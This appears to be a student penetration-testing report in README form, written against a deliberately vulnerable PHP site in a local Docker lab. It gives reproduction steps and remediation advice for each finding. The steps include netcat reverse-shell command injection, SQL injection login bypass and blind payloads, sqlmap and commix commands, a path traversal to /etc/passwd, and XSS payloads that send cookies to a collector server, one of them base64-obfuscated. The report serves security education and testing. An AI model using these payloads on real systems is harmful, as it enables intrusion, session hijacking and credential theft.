## Objective

The objective of this penetration testing (pentest) project is to provide a brief overview of the scope of the pentest, the objectives, and the key findings and recommendations. The scope of the assessment included testing of systems and networks with the timeframe of the assessment and any constraints or limitations. The objective of the assessment was to identify vulnerabilities and evaluate the effectiveness of security controls.

## Key Findings

During the assessment, several key vulnerabilities and security issues were identified, including:

- 1 occurrence of Command Injection
  - **Severity:** Critical
  - **Potential Impact:** Attackers can execute arbitrary code on the targeted system, which can result in the complete compromise of the system or network
- 2 occurrences of SQL Injection
  - **Severity:** Critical
  - **Potential Impact:** Disclosure of database and table names as well as login as an Admin without credentials
- 1 occurrence of Brute Force Attack
  - **Severity:** Critical
  - **Potential Impact:** Crack password of users/admin
- 1 occurrence of File Inclusion
  - **Severity:** High
  - **Potential Impact:** Information disclosure, access to sensitive information, such as configuration files and source code
- 2 occurrences of Stored XSS
  - **Severity:** High
  - **Potential Impact:** Stealing users/admin cookies
- 1 occurrence of Authentication Broken Access
  - **Severity:** High
  - **Potential Impact:** Ability to Enable/Disable or Delete User Accounts or Items
- 1 occurrence of SQL Injection Blind
  - **Severity:** Medium
  - **Potential Impact:** Detect if the user or admin with name XYZ exists or not
- 1 occurrence of Broken Cryptographic Algorithm
  - **Severity:** Medium
  - **Potential Impact:** Detect if the user or admin with name XYZ exists or not
- 2 occurrences of Reflected XSS
  - **Severity:** Medium
  - **Potential Impact:** Stealing users cookies
## Graph 
![image19](https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/16d5a96d-d0e7-452c-991c-d706c4df2b79)


### Conclusion

In conclusion, the website is vulnerable to several high-severity security threats including Authentication Broken Access, Reflected XSS, Stored XSS, SQL Injection Blind, SQL Injection, Authentication Bypass, Broken Cryptographic Algorithm, File Inclusion, Command Injection, and Brute Force Attack. These vulnerabilities pose a significant risk to user data and the reputation of the web application. It is highly recommended that immediate action is taken to address these security concerns to ensure the protection of user data and the integrity of the web application.

## Scope of the Assessment

### Out-of-Scope / Exclusions:
- Social engineering (e.g., phishing)
- Physical security of our offices, and employees
- Any attacks on our customers.
- Attacks against social media or third-party services that Nine uses (LinkedIn, Twitter, etc)
- Vulnerabilities affecting users of outdated browsers.

### Scope:
- **In scope:**
  - Website IP address
  - Car khana server
- **Focus Areas:**
  - Command Injection 
  - XSS
  - SQL Injection 
  - Authentication Broken Access
  - File Inclusion 
  - Server request forgery
  - Brute Force
  - Broken Cryptographic Algorithm

### Out-of-Scope:
- \*.IP

## Vulnerabilities Section

### Command Injection

**Methodology:**
- **Tools and Techniques:** Netcat traditional, Reverse Shell, and Commix
- **Information gathering:** commix.py use automated testing and manual input manipulation to scan the webpage for command injection vulnerability

**Findings:**
- **Vulnerability Details:** Start netcat listener on the pentest container then navigate to the winner.php page and perform command injection by updating URL
- **Evidence:** 
  - Automated Tool (Commix)
    ![image30](https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/16f38b50-2120-4d60-b86e-94ec108bff7d)
    <img width="813" alt="image5" src="https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/48121e7c-f363-40bd-938e-f7809db3e07c">
    <img width="813" alt="image21" src="https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/98759674-6f15-491c-9ee5-95fbf0bb7a83">
    <img width="813" alt="image1" src="https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/0d809ec9-3367-464b-bc08-56e0c54323c7">
#### Steps to reproduce:
- **Automated Tool (Commix):**
  1. On the pentest container start reverse shell using command `nc -lvp 4444`
  2. Clone commix repository and run it with python3
  3. Enter the command with the URL `python3 commix.py -u http://172.25.0.3:80/winner.php?fname=8.8.8.8`
  4. Then enter reverse shell command `nc 172.24.0.5 4444 -e /bin/bash`
- **Manual:**
  1. On the pentest container start reverse shell using command `nc -lvp 4444`
  2. Navigate to winner.php 
  3. Update URL from `http://172.25.0.3:80/winner.php?name=8.8.8.8` to `http://localhost:9000/winner.php?fname=8.8.8.8;nc%20172.24.0.5%204444%20-e%20/bin/bash`
  4. Now navigate to the pentest container to validate reverse shell.

**Remediation Recommendations:**
- Input Validation
- Escaping User Input
- Using Prepared Statements
- Limiting User Permissions
- Avoiding Dynamic System Calls

### SQL Injection (2nd Occurrence)

**Methodology:**
- **Tools and Techniques:** Authentication Bypass with SQL injection
- **Information gathering:** Perform union queries till you reach it to reach the correct number of columns in the table

**Findings:**
- **Vulnerability Details:** By exploiting this vulnerability we get admin access without the correct username and password
- **Evidence:**
  ![image8](https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/c58e8ba6-233d-4ebf-93ac-bcd91932156d)
  ![image29](https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/04b577aa-af5d-4d89-ab20-b04a9ff821e7)
**Steps to Reproduce**
1. Navigate to the login page.
2. Run the following command below the given query in the username field:
3. user' union select 1,VERSION(),3,4,5,6 --
4. It will give access to the first user in the table. In our case, it will be admin access with the correct username and password.

**Remediation Recommendations:**
- Parameterized Queries
- Escape User Input
- Use Strong Input Validation
- Limit User Privileges

### Brute Force Attack

**Methodology:**
- **Techniques:** Burp Suite
- **Information gathering:** If there is no 2-factor authentication and no limit for login attempts

**Findings:**
- **Vulnerability Details:** By exploiting this vulnerability we can perform Information disclosure
- **Evidence:**
  ![image7](https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/845b3028-74ea-412c-b360-66fa7686d1bd)
  <img width="847" alt="image10" src="https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/bea7043f-6b68-44cd-a6f5-1ba2787a9df5">

**Steps to Reproduce**

1. Run Burp Suite.
2. Navigate to the proxy tab.
3. Click on "Open Browser" to launch a browser instance within Burp Suite.
4. Click on "Intercept On" to enable interception of HTTP requests.
5. Enter any username or password on the login page.
6. Right-click on the intercepted request and select "Send to Intruder".
7. In the Intruder tab, navigate to the "Positions" tab.
8. Enclose the `passwordLogin` value with the symbol `ยง`.
9. Click on "Payload" to configure the payload.
10. Load the password file as the payload.
11. Start the attack.
12. Analyze the responses received.
    - In our case, if the response code is 302, it indicates that the password is "123".

**Remediation Recommendations:**
- Implement Rate-Limiting
- Use CAPTCHA
- Use Security Questions
- Use Two-Factor Authentication (2FA)

### File Inclusion

**Methodology:**
- **Techniques:** Dot Dot Slash Attack
- **Information gathering:** Find query parameters requesting pages or files

**Findings:**
- **Vulnerability Details:** By exploiting this vulnerability we can perform Information disclosure
- **Evidence:**
  ![image4](https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/91afee38-e2ad-461a-a7f9-2ea075d32ade)

**Steps to Reproduce**

1. Log in as a user.
2. Click on "Change Password".
3. Update the URL from `http://localhost:9000/welcomePage.php?page=settings.php` to `http://localhost:9000/welcomePage.php?page=../../../../etc/passwd`.
   - You can replace `/etc/passwd` with the path of any other file you want to view on the system.


**Remediation Recommendations:**
- Disallow Direct File Access
- Use Security Functions

### SQL Injection (1st Occurrence)

**Methodology:**
- **Tools and Techniques:** SQLmap, Fingerprinting
- **Information gathering:** Perform fingerprinting to detect database and table names

**Findings:**
- **Vulnerability Details:** By exploiting this vulnerability we get database and table names without any credentials
- **Evidence:**
<img width="455" alt="image2" src="https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/fca83836-eafc-46b8-8793-fc196a4df495">

**Steps to Reproduce**
1. Install SQLMap on your pentest machine.
2. Run the following command, replacing the IP address with the website URL:
3. sqlmap -u "http://172.18.0.5/index.php" --method POST -p "usernameLogin" --data "usernameLogin=test&passwordLogin=test" --dbs
**Remediation Recommendations:**
- Implement Input Validation
- Use Parameterized Queries
- Use Prepared Statements

### Stored XSS (2 occurrences)

**Methodology:**
- **Tools and Techniques:** Base64encode.net, Node.js (Rest API), Session Hijacking
- **Information gathering:** Find pages that contain input fields which stores simple XSS payloads in the database

**Findings:**
- **Vulnerability Details:** By exploiting this vulnerability we are enabling to get user/admin cookies
- **Evidence:**
<img width="437" alt="image3" src="https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/dead8080-6598-4b91-90e9-56a5adeab3e4">
<img width="407" alt="image28" src="https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/1e21c956-e6e1-4f98-88f4-780cffc236cc">
<img width="977" alt="image22" src="https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/95f345e5-ff42-4e5e-8489-9cd09cc0d860">
<img width="969" alt="image25" src="https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/573e1ef8-d469-4e0e-9965-e1f6b825a1ee">
<img width="613" alt="image16" src="https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/d45328b5-2d1a-4f5b-a239-9a8a42fc73ae">

**Steps to Reproduce:**
1. Create and start a REST API for Session Hijacking that accepts every string and saves it in a text file.
2. On the home page, enter the following payload in any of the title or description text boxes:
3. <script>alert(โaโ)</script>
3. Navigate to the search page or admin page to view the malicious alert.
4. After discovering the stored XSS vulnerability, input the following payload into the description field to create an item:
- Original Payload:
  ```javascript
  var img = new Image(0,0); img.src='http://localhost:49160/getNewUser?name=' + document.cookie; document.body.appendChild(img);
  ```
- Encrypted Payload:
  ```javascript
  <script>eval(atob("dmFyIGltZyA9IG5ldyBJbWFnZSgwLDApOyBpbWcuc3JjPSdodHRwOi8vbG9jYWxob3N0OjQ5MTYwL2dldE5ld1VzZXI/bmFtZT0nICsgZG9jdW1lbnQuY29va2llOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGltZyk7"))</script>
  ```
5. Navigate to the search or admin page.
6. Go to your REST API directory and view the `message.txt` file, which contains the cookies of the user/admin who visited the page.
7. Here, you can find the hashed password, which can be decrypted using an MD5 online decryptor (https://www.md5online.it/).



**Remediation Recommendations:**
- Input Validation
- Encrypting Sensitive Data
- User Education

### Authentication Broken Access

**Methodology:**
- **Tools and Techniques:** Gobuster along with SecLists
- **Information gathering:** Gobuster uses a dictionary-based brute-force technique to detect hidden pages on a web server

**Findings:**
- **Vulnerability Details:** If we try to access admin.php directly without login it is not possible but if can create a normal account and log in with this account with no privilege to admin.php and tries to navigate on this page by changing the URL to http://localhost/admin.php then we will successfully enter this page
- **Evidence:**
![image6](https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/0446c240-23d2-4767-9d86-e110cdb68fe6)
**Steps to Reproduce**

- **Manually:**
1. Change the URL from `index.php` to `robots.txt`.
   - Here, you can find an `admin.php` page disallowed.

2. Create a simple account and log in with this account.

3. Change the URL from `http://localhost/welcome.php` to `http://localhost/admin.php`.
   
4. Here, you can delete any item or user and enable or disable any user.

### Automated Tool:
1. Install gobuster and clone the seclist repository for wordlist.

2. Navigate to the SecLists repository on your local machine, specifically to the path `SecLists/Discovery/Web-Content`.

3. Run the following command in your terminal:
  
4. gobuster dir -u http://localhost -w RobotsDisallowed-Top1000.txt

5. This command will reveal the `admin.php` page in the results.
- (Status: 200) [Size: 5923]
- admin.php           (Status: 302) [Size: 0] [--> index.php]
- index.php           (Status: 200) [Size: 5923]
- css/                (Status: 403) [Size: 275]
- ?q=user/password/   (Status: 200) [Size: 5923]
- ?q=user/login/      (Status: 200) [Size: 5923]
- ?q=node/add/        (Status: 200) [Size: 5923]
- ?q=search/          (Status: 200) [Size: 5923]
- ?q=comment/reply/   (Status: 200) [Size: 5923]
- ?q=user/register/   (Status: 200) [Size: 5923]
- ?q=admin/           (Status: 200) [Size: 5923]
- login.php           (Status: 200) [Size: 0]
- js/                 (Status: 403) [Size: 275]
- ?                   (Status: 200) [Size: 5923]
- ?q=user/logout/     (Status: 200) [Size: 5923]
- ?level=12           (Status: 200) [Size: 5923]
- ?q=filter/tips/     (Status: 200) [Size: 5923]
- ?&what=              (Status: 200) [Size: 5923]
- index.php/          (Status: 200) [Size: 5924]
- ?q=contact/         (Status: 200) [Size: 5923]
- ?q=*                (Status: 200) [Size: 5923]
- ?q=logout/          (Status: 200) [Size: 5923]
- ?*                  (Status: 200) [Size: 5923]
- ?favorites          (Status: 200) [Size: 5923]
- ?msk                (Status: 200) [Size: 5923]
- /robots.txt         (Status: 200) [Size: 34]
- /admin.php          (Status: 302) [Size: 0] [--> index.php]

6. Now follow the manual pentest steps from Step C.

**Remediation Recommendations:**
- Implement Role-Based Access Control (RBAC)
- Implement Access Control Mechanisms
- Limit Administrative Access
- Use Strong Authentication Mechanisms
- Tokenization

### SQL Injection Blind (1 Occurrence)

**Methodology:**
- **Tools and Techniques:** SQLmap

**Findings:**
- **Vulnerability Details:** By exploiting this vulnerability we get to know if the user exists or not
- **Evidence**
  ![image8](https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/94ca0b15-d4d7-4f67-b1ee-133ea2c59734)
  ![image15](https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/5b285add-4419-43b2-8c86-2d3cf8703c09)

**Steps to Reproduce**
- **Automated:**
1. Interact with the Kali container.
2. Install sqlmap.
3. Run the following command:
    ```
    sqlmap -u "http://172.18.0.5/index.php" --method POST -p "usernameLogin" --data "usernameLogin=test&passwordLogin=test" --dbs
    ```
- **Manual:**
1. Navigate to the login page.
2. Insert the below given query in the username field:
    ```
    Payload: Admin' and if(1=1,sleep(5),sleep(0)); #
    ```
3. If the username mentioned in the payload exists, it will take 5 seconds to respond; otherwise, it will respond without any delay.

  
**Remediation Recommendations:**
- Use Parameterized Queries
- Escaping Characters
- Use of Prepared Statements
- Validate User Input

### Broken Cryptographic Algorithm

**Findings:**
- **Vulnerability Details:** By exploiting this vulnerability we get to find if a user with the name XYZ exists or not
- **Evidence:**
  ![image18](https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/fe3bc4c6-456c-4afa-a412-c9ea97b28dc6)

- **Steps to Reproduce:**
1. Navigate to the login page.
2. Create a new user with the name you want to validate, using some random password.

**Remediation Recommendations:**
- Change Login by the Username to Email or Phone Number
- Remove Unique Username Constraints
- Change Error Message

### Reflected XSS (2 occurrences)

**Methodology:**
- **Tools and Techniques:** Session Hijacking, Node.js (Rest API)
- **Information gathering:** Find pages that contain query parameters and enter simple XSS payloads to find vulnerability

**Findings:**
- **Vulnerability Details:** By exploiting this vulnerability we are enabling to get user cookies using spear phishing attacks
- **Evidence**
  <img width="969" alt="image25" src="https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/c6e2a631-8af9-445d-9dd0-fb42a10f9f15">
  ![image27](https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/8123dc9b-e171-405b-921e-b37eeee64dc9)
  <img width="625" alt="image24" src="https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/70ee1f46-69b7-4dfc-94c7-6cc12a6e3aae">
  <img width="770" alt="image13" src="https://github.com/MeIbtihajnaeem/pentest_project/assets/55640263/8f06ac5f-b7f1-4d0a-bcf5-ae523ecf8692">

**Steps to Reproduce:**

1. Create and start a REST API for Session Hijacking that accepts every string and saves it in a text file.

2. On the search page, enter the following payload in any of the following search title or username text boxes:
    ```
    <script>alert(โaโ)</script>
    ```

3. After discovering reflected XSS, enter the following payload in any of these input fields, either by textbox or by URL:
    ```
    http://localhost:9000/searchPage.php?searchTitle=<script>new Image().src="http://localhost:49160/getNewUser?name="+document.cookie;</script>
    ```

4. Navigate to your REST API directory and view the `message.txt` file, which contains the cookies of the user who visited the malicious link.

5. Find the hashed password, which can be decrypted using an MD5 online decryptor (such as [https://www.md5online.it/](https://www.md5online.it/)).

**Remediation Recommendations:**
- Input Validation
- Encrypting Sensitive Data
- User Education

## Group of Docker Containers

We have created a group of docker containers with the following names and responsibilities to be on the same network while pen-testing and operations:

- **Pentester:** Container with preinstalled pen-testing tools and scripts for pen-testing
- **Php Env:** Container which runs the vulnerable website
- **Mysql:** Container which handles the database of the website
- **Php My Admin:** Container which allows interacting database using the browser
- **Server:** Container running Node.js rest API

## Docker File for Pentest Container

```dockerfile
FROM kalilinux/kali-last-release
RUN apt-get update && apt-get upgrade -y
RUN apt-get clean
RUN apt-get install -y gobuster
RUN apt-get install -y sqlmap
RUN apt-get install -y git
RUN apt-get install -y python3
RUN apt-get install -y netcat-traditional
WORKDIR /usr/src/app
RUN git clone https://github.com/commixproject/commix.git


## Docker File for PHP ENV Container

FROM php:8.0-apache
WORKDIR /var/www/html
RUN apt update -y && apt upgrade -y libmariadb-dev
RUN docker-php-ext-install mysqli && docker-php-ext-enable mysqli
RUN apt install -y dnsutils
RUN apt-get install -y netcat-traditional
COPY ./project /var/www/html/
RUN chmod -R 775 /var/www/html

## Docker File for SERVER
FROM node:16
WORKDIR /usr/src/app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 8080
CMD [ "node", "server.js" ]

## Docker Compose File for Building Group of Containers

version: '3.9'

services:
 pentester:
   image: meibtihajnaeem/pentester:latest
   tty: true
   ports:
   - 9002:22
 server:
   image: meibtihajnaeem/server:latest
   tty: true
   ports:
   - 49160:8080
 php-env:
   image:  meibtihajnaeem/php_web_app:v2
   tty: true
   ports:
     - 9000:80
 mysql_db:
   image: mysql:5.6.22
   command: --default-authentication-plugin=mysql_native_password
   restart: always
   environment:
     MYSQL_ROOT_PASSWORD: root
     MYSQL_DATABASE: assignment
     MYSQL_USER: root 
 phpmyadmin:
   image: phpmyadmin
   restart: always
   ports:
     - 9001:80
   environment:
     - PMA_ARBITRARY=1
```





